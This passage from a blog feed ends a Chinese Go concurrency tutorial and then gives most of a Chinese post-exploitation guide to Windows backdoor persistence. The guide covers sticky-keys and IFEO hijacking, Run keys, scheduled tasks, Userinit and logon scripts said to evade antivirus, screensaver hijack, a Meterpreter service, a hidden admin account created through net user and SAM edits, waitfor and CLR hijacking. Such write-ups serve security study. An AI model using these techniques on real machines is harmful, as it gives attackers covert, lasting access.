class="string">"received:"</span>,data)</span><br><span class="line">        <span class="comment">// time.Sleep(3 *time.Second) 如果想模拟超时可以加上这条代码</span></span><br><span class="line">        ch&lt;-content</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">    ch:=<span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">interface</span>{})</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> Server(ch,<span class="string">"Send data"</span>)</span><br><span class="line">    recv,err:=Client(ch,<span class="string">"hello"</span>)</span><br><span class="line">    <span class="keyword">if</span> err!=<span class="literal">nil</span>{</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">        fmt.Println(recv)</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>通道响应计时器</p><p>1). 延时回调<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">    IsExit:=<span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">bool</span>)</span><br><span class="line">    fmt.Println(<span class="string">"Start"</span>)</span><br><span class="line">    time.AfterFunc(<span class="number">2</span> * time.Second,<span class="function"><span class="keyword">func</span><span class="params">()</span></span>{</span><br><span class="line">        fmt.Println(<span class="string">"Exec"</span>)</span><br><span class="line">        IsExit&lt;-<span class="literal">true</span></span><br><span class="line">    })</span><br><span class="line">    &lt;-IsExit</span><br><span class="line">    fmt.Println(<span class="string">"Exit"</span>)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">output：</span><br><span class="line">Start</span><br><span class="line">Exec</span><br><span class="line">Exit</span><br></pre></td></tr></tbody></table></figure><p></p><p>2). 定点计时<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">    ticker := time.NewTicker(<span class="number">200</span> * time.Millisecond) <span class="comment">//创建一个打点器，每200毫秒触发一次</span></span><br><span class="line">    breaker:= time.NewTimer(<span class="number">3</span> * time.Second)    <span class="comment">//创建一个计时器，3秒后触发一次</span></span><br><span class="line">    <span class="keyword">var</span> stop <span class="keyword">bool</span> = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">var</span> count <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">for</span>{</span><br><span class="line">        <span class="keyword">select</span>{</span><br><span class="line">        <span class="keyword">case</span> &lt;-ticker.C:</span><br><span class="line">            count++</span><br><span class="line">        <span class="keyword">case</span> &lt;-breaker.C:</span><br><span class="line">            fmt.Println(<span class="string">"Time out break"</span>)</span><br><span class="line">            stop=<span class="literal">true</span></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> stop{</span><br><span class="line">            <span class="keyword">break</span> <span class="comment">//如果breaker通道接收到数据则退出</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    fmt.Println(count)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>从已经关闭中的通道获取数据</p><ol><li>关闭的通道依然可以被访问，访问被关闭的通道将会发生一些问题。</li><li>被关闭的通道不会被置为 nil</li><li>如果尝试对已经关闭的通道进行发送，将会触发宕机</li></ol><p>从已经关闭的通道接收数据或者正在接收数据时，将会接收到通道类型的零值，然后停止阻塞并返回，如下代码<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">    ch:=<span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>,<span class="number">2</span>)</span><br><span class="line">    ch&lt;<span class="number">-1</span></span><br><span class="line">    ch&lt;<span class="number">-2</span></span><br><span class="line">    <span class="built_in">close</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;=<span class="built_in">cap</span>(ch);i++{</span><br><span class="line">        data,ok:=&lt;-ch</span><br><span class="line">        fmt.Println(data,ok)</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">output：</span><br><span class="line"><span class="number">1</span> <span class="literal">true</span></span><br><span class="line"><span class="number">2</span> <span class="literal">true</span></span><br><span class="line"><span class="number">0</span> <span class="literal">false</span> <span class="comment">//false 表示没有获取成功，因为此时通道已经空了</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="活锁、死锁、饥饿"><a href="#活锁、死锁、饥饿" class="headerlink" title="活锁、死锁、饥饿"></a>活锁、死锁、饥饿</h2><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><blockquote><p>死锁：会使得所有并发程序在等待，如果没有外界干预，程序不能恢复</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>出现死锁的几个必要条件，也被称为<code>Coffman</code>条件</p><p><code>Coffman</code> 条件如下：</p><ol><li>相互排斥：井发进程同时拥有资源的独占权。</li><li>等待条件：并发进程必须同时拥有一个资源，并等待额外的资源。</li><li>没有抢占：并发进程拥有的资掘只能被该进程释放，即可满足这个条件。</li><li>循环等待：一个并发进程（P1）必须等待一系列其他井发进程（P2），这些并发进程同时也在等待进程（P2），这样便满足了这个最终条件。</li></ol><h3 id="一些杂项"><a href="#一些杂项" class="headerlink" title="一些杂项"></a>一些杂项</h3><h4 id="生成二维码"><a href="#生成二维码" class="headerlink" title="生成二维码"></a>生成二维码</h4><p>获取包：<code>go get github.com/skip2/go-qrcode</code></p><p>生成一个跳转到百度的二维码<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line">import "github.com/skip2/go-qrcode"</span><br><span class="line">func main() {</span><br><span class="line">    qrcode.WriteFile("http://www.baidu.com/",qrcode.Medium,256,"./qrcode.png")</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows中常见后门持久化方法总结</title>
      <link href="/2019/10/02/windows%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
      <url>/2019/10/02/windows%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<blockquote><p>文章首发于先知社区：<a href="https://xz.aliyun.com/t/6461" target="_blank" rel="noopener">https://xz.aliyun.com/t/6461</a></p></blockquote><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当我们通过各种方法拿到一个服务器的权限的时候，我们下一步要做的就是<code>后渗透</code>了，而后门持久化也是我们后渗透很重要的一部分，下面我来总结一下<code>windows</code>下常见的后门持久化的方法</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191001233211-a300dd9e-e460-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h1 id="后门持久化"><a href="#后门持久化" class="headerlink" title="后门持久化"></a>后门持久化</h1><p>我的操作环境是：</p><ol><li>无AV、管理员权限（提权、免杀等是后门持久化的铺垫，当然有的方法也并不是全部需要这些铺垫）</li><li>操作系统：<code>win7</code>，<code>windows server 2008R2</code>，<code>xp</code></li></ol><h2 id="shift后门"><a href="#shift后门" class="headerlink" title="shift后门"></a>shift后门</h2><p>这个是比较老的方式了，这里简单讲一下，在windows中有一些辅助功能，能在用户未登录系统之前可以通过组合键来启动它，类似的辅助功能有：</p><ol><li><p><code>C:\Windows\System32\sethc.exe</code> 粘滞键，启动快捷键：按五次shift键</p></li><li><p><code>C:\Windows\System32\utilman.exe</code> 设置中心，启动快捷键：Windows+U键</p></li></ol><p>在低版本的windows中，我们可以直接把<code>setch.exe</code>替换成我们的后门程序，下面我们把<code>setch.exe</code>替换为<code>cmd.exe</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190917230148-12cf0e8a-d95c-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190917230303-3f489c88-d95c-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h2><p>这个和shift后门差不多，只不过在低版本的windows中，我们可以简单地替换程序，但是在高版本的windows版本中替换的文件受到了系统的保护，所以这里我们要使用另外一个知识点：映像劫持。</p><p>“映像劫持”，也被称为”IFEO”（Image File Execution Options）</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">就是Image File Execution Options（其实应该称为"image Hijack"。）是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。由于这个项主要是用来调试程序用的，对一般用户意义不大。默认是只有管理员和local system有权读写修改。</span><br><span class="line">PS：来自百度百科</span><br></pre></td></tr></tbody></table></figure><p>简单来说就是当目标程序被映像劫持时，当我们启动目标程序时，启动的是劫持后的程序而不是原来的程序</p><p>操作也很简单，在注册表的<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option</code>下添加一个项<code>sethc.exe</code>，然后在<code>sethc.exe</code>这个项中添加<code>debugger</code>键，键值为我们恶意程序的路径，如下图</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190918082823-394420d8-d9ab-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>效果如下</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190918082909-54c98e6a-d9ab-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="注册表自启动项"><a href="#注册表自启动项" class="headerlink" title="注册表自启动项"></a>注册表自启动项</h2><p><code>MSF</code>的<code>Persistence</code>模块利用的就是写注册表自启动项来实现的，一般自启动项是这两个键：<code>Run</code>和<code>RunOnce</code>，两者的区别如下</p><ol><li><p>Run：该项下的键值即为开机启动项，每一次随着开机而启动。</p></li><li><p>RunOnce：RunOnce和Run差不多，唯一的区别就是RunOnce的键值只作用一次，执行完毕后就会自动删除</p></li></ol><p>常见注册表启动项键的位置：</p><p>用户级<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></tbody></table></figure><p></p><p>系统级<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></tbody></table></figure><p></p><p>修改一下：<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190918083813-98e4f322-d9ac-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><p>执行结果：<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190918085725-475ca3e4-d9af-1.gif" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p></p><h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><p>windows下定时任务的命令有两个分别是：<code>at</code>和<code>schtasks</code>，他们两者主要区别是<code>at</code>命令在<code>win7</code>、<code>08</code>等高版本的windows中是不能将任务在前台执行的，也就是只会打开一个后台进程，而<code>schtasks</code>是将定时的任务在前台执行，下面我们逐个看看</p><p><code>at</code>的一些参数<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AT [\\computername] time [/INTERACTIVE]</span><br><span class="line">    [ /EVERY:date[,...] | /NEXT:date[,...]] "command"</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>at</code>的执行如下：<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190918215623-1959734c-da1c-1.gif" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p></p><p><code>schtasks</code>一些参数：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn TaskName /tr TaskRun /sc schedule [/mo modifier] [/d day] [/m month[,month...] [/i IdleTime] [/st StartTime] [/sd StartDate] [/ed EndDate] [/s computer [/u [domain\]user /p password]] [/ru {[Domain\]User | "System"} [/rp Password]] /?</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>schtasks</code>的执行如下：<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190918220600-71adc952-da1d-1.gif" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p></p><h2 id="用户登陆初始化"><a href="#用户登陆初始化" class="headerlink" title="用户登陆初始化"></a>用户登陆初始化</h2><p><code>Userinit</code>的作用是用户在进行登陆初始化设置时，<code>WinLogon</code>进程会执行指定的<code>login scripts</code>，所以我们可以修改它的键值来添加我们要执行的程序</p><p>注册表路径为：<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code>，我们添加一个我们启动的程序，多个程序用逗号隔开</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190921093213-a3475d9a-dc0f-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>效果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190921093624-390759f2-dc10-1.gif" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Logon-Scripts"><a href="#Logon-Scripts" class="headerlink" title="Logon Scripts"></a>Logon Scripts</h2><p><code>Logon Scripts</code>优先于av先执行，我们可以利用这一点来绕过av的敏感操作拦截</p><p>注册表路径为：<code>HKEY_CURRENT_USER\Environment</code>，创建一个键为：<code>UserInitMprLogonScript</code>，其键值为我们要启动的程序路径</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190921092903-31fe94fa-dc0f-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>效果如下：<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190921092825-1bb19288-dc0f-1.gif" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p></p><h2 id="屏幕保护程序"><a href="#屏幕保护程序" class="headerlink" title="屏幕保护程序"></a>屏幕保护程序</h2><p>在对方开启屏幕保护的情况下，我们可以修改屏保程序为我们的恶意程序从而达到后门持久化的目的<br>其中屏幕保护的配置存储在注册表中，其位置为：<code>HKEY_CURRENT_USER\Control Panel\Desktop</code>，关键键值如下：</p><ol><li><p><code>SCRNSAVE.EXE</code> - 默认屏幕保护程序，我们可以把这个键值改为我们的恶意程序</p></li><li><p><code>ScreenSaveActive</code> - 1表示屏幕保护是启动状态，0表示表示屏幕保护是关闭状态</p></li><li><p><code>ScreenSaverTimeout</code> - 指定屏幕保护程序启动前系统的空闲事件，单位为秒，默认为900（15分钟）</p></li></ol><p>设置如下：<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190920172700-ccb37e20-db88-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><p>效果图：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190920172852-0f332750-db89-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="自启动服务"><a href="#自启动服务" class="headerlink" title="自启动服务"></a>自启动服务</h2><p>自启动服务一般是在电脑启动后在后台加载指定的服务程序，我们可以将<code>exe</code>文件注册为服务，也可以将<code>dll</code>文件注册为服务</p><p>为了方便起见我们可以直接用<code>Metasploit</code>来注册一个服务</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run metsvc -A</span><br></pre></td></tr></tbody></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190927125532-09484cc6-e0e3-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>运行之后msf会在<code>%TMP%</code>目录下创建一个随机名称的文件夹，然后在该文件夹里面生成三个文件：<code>metsvc.dll</code>、<code>metsvc-server.exe</code>、<code>metsvc.exe</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190927125725-4cab43a6-e0e3-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>同时会新建一个服务，其显示名称为<code>Meterpreter</code>，服务名称为<code>metsvc</code>，启动类型为”自动”，默认绑定在31337端口。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190927125854-81895838-e0e3-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190927131321-85fb6012-e0e5-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>如果想删除服务，可以执行<br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run metsvc -r</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="影子用户"><a href="#影子用户" class="headerlink" title="影子用户"></a>影子用户</h2><p>影子用户顾名思义就是一个隐藏用户，只能通过注册表查看这个用户，其它方式是找不到这个用户的信息的</p><p>在用户名后面加一个<code>$</code>可以创建一个匿名用户，创建完毕后我们再把这个用户添加到administrator组<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user test$ test /add</span><br><span class="line">net localgroup administrators test$ /add</span><br></pre></td></tr></tbody></table></figure><p></p><p>可以看到<code>net user</code>是看不到我们创建的用户，但是计算机管理-用户和组中可以看到</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190927202719-25c6764a-e122-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>所以这时候我们就需要修改一下注册表，其键位置为：<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users</code></p><p>注意：<code>SAM</code>键值默认是只能<code>system</code>权限修改的，所以我们要修改一下<code>SAM</code>键的权限，给予<code>administrator</code>完全控制和读取的权限</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190927160157-13cfe2d4-e0fd-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>然后我们将<code>administrator</code>用户对应的项中的F值复制到<code>test$</code>对应xiang中的F值，然后保存</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190927160710-ce3ec374-e0fd-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>然后我们将<code>test$</code>删除掉<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user test$ /del</span><br></pre></td></tr></tbody></table></figure><p></p><p>然后再双击导出的注册表文件，然后我们再看一下</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190927161853-71985b2e-e0ff-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p><code>net user</code>和计算机管理-用户和组中都查看不到用户了，但是我们可以用<code>net user test$</code>查看用户信息</p><p>这个时候我们再用<code>net user test$ /del</code>是删除不掉这个用户的，只能通过注册表来删除。</p><h2 id="waitfor"><a href="#waitfor" class="headerlink" title="waitfor"></a>waitfor</h2><p>关于<code>waitfor</code>手册中是这么解释的：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在系统上发送或等待信号。waitfor可用于跨网络同步计算机。</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>waitfor</code>的语法<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">waitfor [/s &lt;Computer&gt; [/u [&lt;Domain&gt;\]&lt;User&gt; [/p [&lt;Password&gt;]]]] /si &lt;SignalName&gt;</span><br><span class="line">waitfor [/t &lt;Timeout&gt;] &lt;SignalName&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>参数解释：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/s &lt;Computer&gt;  指定远程计算机的名称或IP地址，默认为本地计算机</span><br><span class="line">/u [&lt;Domain&gt;]&lt;user&gt;    使用指定用户帐户的凭据运行脚本。默认是使用当前用户的凭据。</span><br><span class="line">/p &lt;Password&gt;  指定/u参数中指定的用户帐户的密码。</span><br><span class="line">/si    发送指定激活信号。</span><br><span class="line">/t   指定等待信号的秒数。默认为无限期等待。 </span><br><span class="line">&lt;SignalName&gt;    指定等待或发送的信号，不区分大小写，长度不能超过225个字符</span><br></pre></td></tr></tbody></table></figure><p></p><p>关于<code>waitfor</code>更多的信息可以看一下微软提供的手册：<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/waitfor" title="链接" target="_blank" rel="noopener">链接</a></p><p>我们来测试一下看看<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">waitfor test &amp;&amp; calc 表示接收信号成功后执行计算器</span><br><span class="line"></span><br><span class="line">waitfor /s 192.168.163.143 /u qiyou /p qiyou /si test</span><br></pre></td></tr></tbody></table></figure><p></p><p>结果如下<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190929165512-d935c59e-e296-1.gif" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p></p><p>但是这样只能执行一次，这对我们后门持久化很不利，所以我们得想办法让它持久化。</p><p>这里就要借用一下三好师傅的<code>powershell</code>脚本：<a href="https://github.com/3gstudent/Waitfor-Persistence/blob/master/Waitfor-Persistence.ps1" title="链接" target="_blank" rel="noopener">链接</a>，三好师傅的分析：<a href="https://3gstudent.github.io/3gstudent.github.io/Use-Waitfor.exe-to-maintain-persistence/" title="链接" target="_blank" rel="noopener">链接</a></p><p>执行效果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190929173253-1cad2d30-e29c-1.gif" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>该方法的优点就是能主动激活，但是缺点也明显就是只能在同一网段才能接收和发送激活信号、服务器重启之后就不行了。</p><h2 id="CLR"><a href="#CLR" class="headerlink" title="CLR"></a>CLR</h2><p>CLR的简述（来自百度百科）<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CLR(公共语言运行库,Common Language Runtime)和Java虚拟机一样也是一个运行时环境，是一个可由多种编程语言使用的运行环境。CLR的核心功能包括：内存管理、程序集加载、安全性、异常处理和线程同步，可由面向CLR的所有语言使用。并保证应用和底层操作系统之间必要的分离。CLR是.NET Framework的主要执行引擎。</span><br></pre></td></tr></tbody></table></figure><p></p><p>需要注意的是<code>CLR</code>能够劫持系统中全部<code>.net</code>程序，而且系统默认会调用<code>.net</code>程序，从而导致我们的后门自动触发，这是我们后门持久化的一个好的思路，下面来实现一下</p><p>修改一下注册表，注册表路径：<code>HKEY_CURRENT_USER\Software\Classes\CLSID\</code>，新建子项<code>{11111111-1111-1111-1111-111111111111}</code>（名字随便，只要不与注册表中存在的名称冲突就行），然后再新建子项<code>InProcServer32</code>，新建一个键<code>ThreadingModel</code>，键值为：<code>Apartment</code>，默认的键值为我们<code>dll</code>的路径</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img 